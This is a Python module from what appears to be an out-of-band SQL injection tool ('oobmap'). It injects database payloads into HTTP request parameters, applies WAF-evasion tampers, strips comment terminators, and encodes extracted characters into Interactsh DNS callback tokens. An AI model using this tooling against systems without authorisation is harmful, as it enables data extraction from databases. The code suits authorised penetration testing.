import uuid

from ..oob import InteractshLog, MultiInteractshLog
from ..payloads import PROFILES
from ..session import SessionStore
from ..tamper import TAMPERS, apply_tampers
from ..transport import inject, parse_raw_request, send
from ..utils.logging import _log
from .detection import normalize_domain


def token_for(run_id: str, pos: int, char: str) -> str:
    return f"{run_id}-p{pos:02d}-c{ord(char):02x}"


def load_common(args):
    profile = PROFILES[args.dbms]
    request = parse_raw_request(args.request)
    domain = normalize_domain(args.domain)
    log = MultiInteractshLog(args.log) if len(args.log) > 1 else InteractshLog(args.log[0])
    run_id = args.run_id or uuid.uuid4().hex[:6]
    if args.base is None:
        from ..transport import current_value
        args.base = current_value(request, args.param, args.place)
    session = SessionStore(args.output_dir, request, args.force_ssl, flush=args.flush_session)
    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
    unknown = [t for t in tamper_names if t not in TAMPERS]
    if unknown:
        raise SystemExit(f"unknown tamper(s): {', '.join(unknown)}. Run 'oobmap tampers' for the list.")
    return profile, request, domain, log, run_id, session


def send_payload(args, request, payload):
    tamper_names = [t.strip() for t in getattr(args, "tamper", "").split(",") if t.strip()]
    if tamper_names:
        payload = apply_tampers(payload, tamper_names)
    injected = inject(request, args.param, payload, args.place)
    try:
        status, body = send(
            injected,
            force_ssl=args.force_ssl,
            timeout=args.http_timeout,
            proxy=getattr(args, "proxy", None),
            verify_ssl=not getattr(args, "no_verify_ssl", False),
        )
        if args.verbose:
            _log("DEBUG", f"http {status}  {len(body)} bytes")
    except Exception as exc:
        if args.verbose:
            _log("DEBUG", f"http error (ignored): {exc}")


def strip_payload_terminator(payload: str) -> str:
    stripped = payload.rstrip()
    for terminator in ("-- -", "--", "/*", "#"):
        if stripped.endswith(terminator):
            return stripped[: -len(terminator)].rstrip()
    return stripped


def expand_payloads(args, payloads):
    variants = list(payloads)
    for suffix in getattr(args, "payload_suffix", None) or []:
        for payload in payloads:
            variants.append(strip_payload_terminator(payload) + suffix)
    return list(dict.fromkeys(variants))


def send_payloads(args, request, payloads):
    for payload in expand_payloads(args, payloads):
        send_payload(args, request, payload)
